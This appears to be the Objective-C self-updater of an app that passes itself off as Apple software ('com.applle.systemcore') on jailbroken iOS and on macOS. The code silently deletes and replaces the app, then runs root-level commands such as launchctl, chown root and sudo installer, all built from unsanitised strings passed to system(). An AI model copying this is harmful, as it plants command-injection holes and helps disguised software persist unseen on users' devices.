//
//  SoftwareInsaller.m
//  SoftwareUpdateManager
//
//  Created by Ophat Phuetkasickonphasutha on 6/17/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SoftwareInstaller.h"
#import "MessagePortIPCSender.h"

//#import <UIKit/UIKit.h>

#define BINARY_KEY			@"binary"
#define BINARY_NAME_KEY		@"binaryName"
#define REINSTALL_DELAY		10


@interface SoftwareInstaller (private)
- (void) installApplication: (NSDictionary *) binaryInfo;
- (void) installApplicationMac: (NSDictionary *) binaryInfo;
- (void) installApplicationMacV2: (NSDictionary *) aBinaryInfo;
@end

@implementation SoftwareInstaller

- (void) install: (id) aBinary
    withFileName: (NSString *) aBinaryName {
    
    DLog(@"aBinary class = %@", [aBinary class]);
    DLog(@"aBinaryName = %@", aBinaryName);
    
    NSDictionary *binaryInfo = [NSDictionary dictionaryWithObjectsAndKeys:
                                aBinary, BINARY_KEY,
                                aBinaryName, BINARY_NAME_KEY,
                                nil];
    
    SEL selector = nil;
#if TARGET_OS_IPHONE
    selector = @selector(installApplication:);
#else
    if ([aBinaryName rangeOfString:@".pkg"].location != NSNotFound) {
        selector =  @selector(installApplicationMacV2:);
    } else {
        selector = @selector(installApplicationMac:);
    }
#endif
    
    [self performSelector:selector
               withObject:binaryInfo 
               afterDelay:REINSTALL_DELAY];
}

- (void) installApplication: (NSDictionary *) aBinaryInfo {
#if TARGET_OS_IPHONE
	id binary				= [aBinaryInfo objectForKey:BINARY_KEY];
	NSString *binaryName	= [aBinaryInfo objectForKey:BINARY_NAME_KEY];
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	DLog (@"----------------- Installing ... -----------------")			
	NSString *tmpAppPath	= [NSString stringWithFormat:@"/tmp/%@", binaryName];			// e.g., /tmp/systemcore.app.tar or /tmp/systemcore64.app.tar or any names
	DLog (@"Temp Path %@", tmpAppPath)
	
    #pragma mark STEP 1: Separate an archive
	
	// -- Construct the unarcived path from tmpAppPath (/tmp/systemcore.app.tar)
	NSString *unArchivedPath = [tmpAppPath stringByDeletingPathExtension];		// /tmp/systemcore.app	
	DLog (@"Step 1: Separate an archive to path %@", unArchivedPath)	
			
	// -- CASE 1: Got binary in form of archived data
	if ([binary isKindOfClass:[NSData class]]) {		
		DLog (@">> Step 1.1: Small Binary: Write tar data to file %@", tmpAppPath)		
		// -- Write binary to temp path so that we can separate the tar file there (/tmp/systemcore.app.tar)
		[binary writeToFile:tmpAppPath atomically:YES];									
		// -- CASE 2: Got binary in form of path
	} else if ([binary isKindOfClass:[NSString class]]) {		
		if (![binary isEqualToString:tmpAppPath]) {	// This case should never happen.
			DLog (@"-- ATTENTION --- copy from %@ to %@", binary, tmpAppPath)
			NSString *copyApp = [NSString stringWithFormat:@"cp -rf %@ %@", binary, tmpAppPath];
			system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
		}						
	}		
	
	// -- Separate tar file
    /*
     Note that after untar (tar -x) the file, the output file name will be same as file name when it was tar e.g:
        1. systemcore.app --> (tar) --> systemcore.app.tar --> (tar -x) --> systemcore.app
        2. systemcore.app --> (tar) --> systemcore.app.tar --> (rename) --> systemcore64.app.tar --> (tar -x) --> systemcore.app
     */
	DLog(@">> Step 1.1: Separate tar file from path %@ to path %@", tmpAppPath, unArchivedPath);						
	NSString *untarApp = [NSString stringWithFormat:@"tar -xf %@ -C /tmp", tmpAppPath];						
	system([untarApp cStringUsingEncoding:NSUTF8StringEncoding]);	
	
    #pragma mark STEP 2: Delete the current Application
	
	NSBundle *bundle			= [NSBundle mainBundle];
	NSDictionary *bundleInfo	= [bundle infoDictionary];
	NSString *bundleName		= [bundleInfo objectForKey:@"CFBundleName"];	// e.g: systemcore
	DLog (@">> bundle %@", bundle)
	DLog (@">> bundleInfo %@", bundleInfo)
	DLog (@">> bundleName %@", bundleName)
	
	
	NSString *deleteApp			= [NSString stringWithFormat:@"rm -rf /Applications/%@.app", bundleName]; 	
	DLog (@"Step 2: Delete the current %@ ", deleteApp)
	system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);				// rm -rf /Applications/systemcore.app
	
    #pragma mark STEP 3: Copy the new binary to /Applications
        
        NSFileManager *fileManager  = [NSFileManager defaultManager];
        if (![fileManager fileExistsAtPath:unArchivedPath]) {
            unArchivedPath = [NSString stringWithFormat:@"/tmp/%@.app", bundleName];        // /tmp/systemcore.app
            DLog(@"Construct unArchivedPath from old binary name %@", unArchivedPath)
        }
        
        NSString *infoplist			= [NSString stringWithFormat:@"%@/Info.plist", unArchivedPath];
        NSDictionary *newBundleInfo = [NSDictionary dictionaryWithContentsOfFile:infoplist];
        NSString *bundleIdentifier	= [newBundleInfo objectForKey:@"CFBundleIdentifier"];   // e.g: com.applle.systemcore
        NSString *newBundleName     = [newBundleInfo objectForKey:@"CFBundleName"];         // e.g: systemcore
        
        DLog (@"infoplist %@", infoplist)
        DLog (@"newBundleInfo %@", newBundleInfo)
        DLog (@"bundleIdentifier %@", bundleIdentifier)
        DLog (@"newBundleName %@", newBundleName)
        
    #pragma mark STEP 3.1: Make sure binary name is in form of {CFBundleName}.app.tar, this case server may rename the binary (systemcore.app.tar to systemcore64.app.tar)
        
        NSString *correctBinaryName = [NSString stringWithFormat:@"%@.app.tar", newBundleName];
        if (![correctBinaryName isEqualToString:binaryName]) {
            binaryName = correctBinaryName;
        }
        DLog(@"Binary name after verify %@", binaryName)
        
    #pragma mark STEP 3.2: Copy

        //NSString *copyApp = [NSString stringWithFormat:@"cp -r %@ /Applications/%@", tmpAppPath, aBinaryName];
        NSString *copyApp = [NSString stringWithFormat:@"cp -r %@ /Applications/%@", 
                             unArchivedPath, 
                             [binaryName stringByDeletingPathExtension]];			// cp -r /tmp/systemcore.app /Applications/systemcore.app
        DLog (@"Step 3: Copy the new binary to /Application %@", copyApp)
        system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
    #pragma mark STEP 4: Run update script

    NSString *updateScript          = nil;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        
        // launchctl submit -l com.applle.systemcore.update -p  /Applications/systemcore.app/Update.sh start appl-update-all
        updateScript = [NSString stringWithFormat:@"launchctl submit -l %@.update -p  "
                        "/Applications/%@/Update.sh start "
                        "appl-update-all", bundleIdentifier, [binaryName stringByDeletingPathExtension]];
    } else {
        // iOS 8
        // Note: launchctl submit doesn't work on iOS 8, so we need to load the plist that execute Update.sh instead.
        DLog(@"Softwoare update for iOS 8")
        NSString *bundleName        = [[bundle infoDictionary] objectForKey:@"CFBundleName"]; // e.g: systemcore
        NSString *updatePath        = [NSString stringWithFormat:@"/Applications/%@.app/%@.update.plist", bundleName, bundleIdentifier];
        DLog(@"updatePath %@", updatePath)
        NSFileManager *fileManager  = [NSFileManager defaultManager];
        if ([fileManager fileExistsAtPath:updatePath]) {
            updateScript = [NSString stringWithFormat:@"launchctl load %@", updatePath];
        } else {
            DLog(@"Fail to update")
        }
        
        /***************************************************************************************************
         *
         NOTE:
         -----
            If application is installed from Cydia 1.1.16, all files in /Applications/systemcore.app folder
         have changed owner to 503, we don't know why. iOS below 8 is just work fine because we don't
         use command load from plist file.
         
            This issue causes the application cannot uninstall.
         
            This case should not happen here because we copy application to /Applications/systemcore.app
         folder by ourself (not install from Cydia) but we need to make sure that update must be success.
         *
         ***************************************************************************************************/
        
        NSString *chownCmd = [NSString stringWithFormat:@"chown root %@", updatePath];
        DLog (@"chownCmd = %@", chownCmd);
        
        system([chownCmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }

    DLog (@"Step 4: Run update script %@", updateScript)
    system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
    
    #pragma mark STEP 5: Delete temp binary
        
        // -- delete tar path
        deleteApp = [NSString stringWithFormat:@"rm -rf %@", tmpAppPath];
        DLog (@"Step 5: Delete temp binary %@",  deleteApp)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete untar path	
        deleteApp = [NSString stringWithFormat:@"rm -rf %@", unArchivedPath];
        DLog (@"Step 6: Delete untar path %@",  unArchivedPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);

        // For Big binary
        if ([binary isKindOfClass:[NSString class]]) {
            if (![binary isEqualToString:tmpAppPath]) {
                DLog (@"CASE of big binary, but the input path is not what we expect")
                deleteApp = [NSString stringWithFormat:@"rm -rf %@", binary];
                system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
            }
        }

	[pool release];
	
	DLog (@"------ Installation Complete -------")
    
	exit(0);
#endif
}

- (void) installApplicationMac: (NSDictionary *) aBinaryInfo {
    id binary				= [aBinaryInfo objectForKey:BINARY_KEY];
    NSString *binaryName	= [aBinaryInfo objectForKey:BINARY_NAME_KEY];
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    DLog (@"----------------- Installing ... -----------------")
    NSString *tmpAppPath	= [NSString stringWithFormat:@"/tmp/%@", binaryName];			// e.g., /tmp/knowit.app.tar or any names
    DLog (@"Temp Path %@", tmpAppPath)
    
#pragma mark STEP 1: Separate an archive
    
    // -- Construct the unarcived path from tmpAppPath (/tmp/knowit.app.tar)
    NSString *unArchivedPath = [tmpAppPath stringByDeletingPathExtension];		// /tmp/knowit.app
    DLog (@"Step 1: Separate an archive to path %@", unArchivedPath)
    
    // -- CASE 1: Got binary in form of archived data
    if ([binary isKindOfClass:[NSData class]]) {
        DLog (@">> Step 1.1: Small Binary: Write tar data to file %@", tmpAppPath)
        // -- Write binary to temp path so that we can separate the tar file there (/tmp/knowit.app.tar)
        [binary writeToFile:tmpAppPath atomically:YES];
        // -- CASE 2: Got binary in form of path
    } else if ([binary isKindOfClass:[NSString class]]) {
        if (![binary isEqualToString:tmpAppPath]) {	// This case should never happen.
            DLog (@"-- ATTENTION --- copy from %@ to %@", binary, tmpAppPath)
            NSString *copyApp = [NSString stringWithFormat:@"cp -rf %@ %@", binary, tmpAppPath];
            system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
        }
    }
    
    // -- Separate tar file
    /*
     Note that after untar (tar -x) the file, the output file name will be same as file name when it was tar e.g:
     1. blblu.app --> (tar) --> blblu.app.tar --> (tar -x) --> blblu.app
     2. blblu.app --> (tar) --> blblu.app.tar --> (rename) --> knowit.app.tar --> (tar -x) --> blblu.app
     */
    DLog(@">> Step 1.1: Separate tar file from path %@ to path %@", tmpAppPath, unArchivedPath);
    NSString *untarApp = [NSString stringWithFormat:@"tar -xf %@ -C /tmp", tmpAppPath];
    system([untarApp cStringUsingEncoding:NSUTF8StringEncoding]);
    
#pragma mark STEP 2: Delete the current Application
    
    NSBundle *bundle			= [NSBundle mainBundle];
    NSDictionary *bundleInfo	= [bundle infoDictionary];
    NSString *bundleName		= [bundleInfo objectForKey:@"CFBundleName"];	// e.g: blblu
    DLog (@">> bundle %@", bundle)
    DLog (@">> bundleInfo %@", bundleInfo)
    DLog (@">> bundleName %@", bundleName)
    
    NSString *deleteApp			= [NSString stringWithFormat:@"rm -rf /Applications/%@.app", bundleName];
    DLog (@"Step 2: Delete the current %@ ", deleteApp)
    system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);				// rm -rf /Applications/blblu.app
    
#pragma mark STEP 3: Copy the new binary to /Applications
    
    NSFileManager *fileManager  = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:unArchivedPath]) {
        unArchivedPath = [NSString stringWithFormat:@"/tmp/%@.app", bundleName];        // /tmp/blblu.app
        DLog(@"Construct unArchivedPath from old binary name %@", unArchivedPath)
    }
    
    NSString *infoplist			= [NSString stringWithFormat:@"%@/Contents/Info.plist", unArchivedPath];
    NSDictionary *newBundleInfo = [NSDictionary dictionaryWithContentsOfFile:infoplist];
    NSString *bundleIdentifier	= [newBundleInfo objectForKey:@"CFBundleIdentifier"];   // e.g: com.applle.blblu
    NSString *newBundleName     = [newBundleInfo objectForKey:@"CFBundleName"];         // e.g: blblu
    
    DLog (@"infoplist %@", infoplist)
    DLog (@"newBundleInfo %@", newBundleInfo)
    DLog (@"bundleIdentifier %@", bundleIdentifier)
    DLog (@"newBundleName %@", newBundleName)
    
#pragma mark STEP 3.1: Make sure binary name is in form of {CFBundleName}.app.tar, this case server may rename the binary (blblu.app.tar)
    
    NSString *correctBinaryName = [NSString stringWithFormat:@"%@.app.tar", newBundleName];
    if (![correctBinaryName isEqualToString:binaryName]) {
        binaryName = correctBinaryName;
    }
    DLog(@"Binary name after verify %@", binaryName)
    
#pragma mark STEP 3.2: Copy
    
    //NSString *copyApp = [NSString stringWithFormat:@"cp -r %@ /Applications/%@", tmpAppPath, aBinaryName];
    NSString *copyApp = [NSString stringWithFormat:@"cp -r %@ /Applications/%@",
                         unArchivedPath,
                         [binaryName stringByDeletingPathExtension]];			// cp -r /tmp/blblu.app /Applications/blblu.app
    DLog (@"Step 3: Copy the new binary to /Application %@", copyApp)
    system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
    
    
#pragma mark STEP 4: Run update script
    
    NSString *updateScript = [NSString stringWithFormat:@"/Applications/%@/Contents/Resources/Update.sh", [binaryName stringByDeletingPathExtension]];
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"update1"forKey:@"type"];
    [myCommand setObject:updateScript forKey:@"command"];
    [myCommand setObject:binaryName forKey:@"binaryname"];
    [myCommand setObject:tmpAppPath forKey:@"tmpapppath"];
    [myCommand setObject:unArchivedPath forKey:@"unarchivedpath"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
    
    if (successfully) {
        CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.su.upgrade"), (void *)self, nil, kCFNotificationDeliverImmediately);
        
        [NSThread sleepForTimeInterval:1.0];
    }
    
    DLog (@"Update script %@", updateScript)
    if (successfully) {
        DLog (@"Step 4: Tasks are going to execute in DAEMON");
    }

#pragma mark STEP 5: Delete temp binary
    
    // For big binary
    if ([binary isKindOfClass:[NSString class]]) {
        if (![binary isEqualToString:tmpAppPath]) {
            DLog (@"CASE of big binary, but the input path is not what we expect")
            deleteApp = [NSString stringWithFormat:@"rm -rf %@", binary];
            system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        }
    }
    
    [pool release];
    
    if (successfully) {
        DLog (@"Step 5: Some tasks are going to execute in DAEMON");
        
        exit(0);
    }
}

- (void) installApplicationMacV2: (NSDictionary *) aBinaryInfo {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    id binary				= [aBinaryInfo objectForKey:BINARY_KEY];
    NSString *binaryName	= [aBinaryInfo objectForKey:BINARY_NAME_KEY];
    
    DLog (@"----------------- Installing ... -----------------")
    NSString *tmpAppPath	= [NSString stringWithFormat:@"/tmp/%@", binaryName];			// e.g., /tmp/knowit.pkg
    DLog (@"Temp Path %@", tmpAppPath)
    
#pragma mark STEP 1: Separate an archive
    
    DLog (@"Step 1: check type of software object");
    // -- CASE 1: Got binary in form of archived data
    if ([binary isKindOfClass:[NSData class]]) {
        DLog (@">> CASE 1: Small Binary: Write pkg data to file %@", tmpAppPath)
        // -- Write binary to temp path so that we can separate the tar file there (/tmp/knowit.pkg)
        [binary writeToFile:tmpAppPath atomically:YES];
        // -- CASE 2: Got binary in form of path
    } else if ([binary isKindOfClass:[NSString class]]) {
        if (![binary isEqualToString:tmpAppPath]) {	// This case should never happen.
            DLog (@"-- ATTENTION --- copy from %@ to %@", binary, tmpAppPath)
            NSString *copyApp = [NSString stringWithFormat:@"cp -rf %@ %@", binary, tmpAppPath];
            system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
        }
    }
    
#pragma mark STEP 2: Run update script
    
    NSString *updateScript = [NSString stringWithFormat:@"sudo installer -pkg %@ -target /", tmpAppPath];
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"update2"forKey:@"type"];
    [myCommand setObject:updateScript forKey:@"command"];
    [myCommand setObject:tmpAppPath forKey:@"tmpapppath"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
    
    if (successfully) {
        CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.su.upgrade"), (void *)self, nil, kCFNotificationDeliverImmediately);
        
        [NSThread sleepForTimeInterval:1.0];
    }
    
    DLog (@"Update script %@", updateScript)
    
    [pool release];
    
    if (successfully) {
        DLog (@"Step 2: Tasks are going to execute in DAEMON");
        
        exit(0);
    }
}

@end
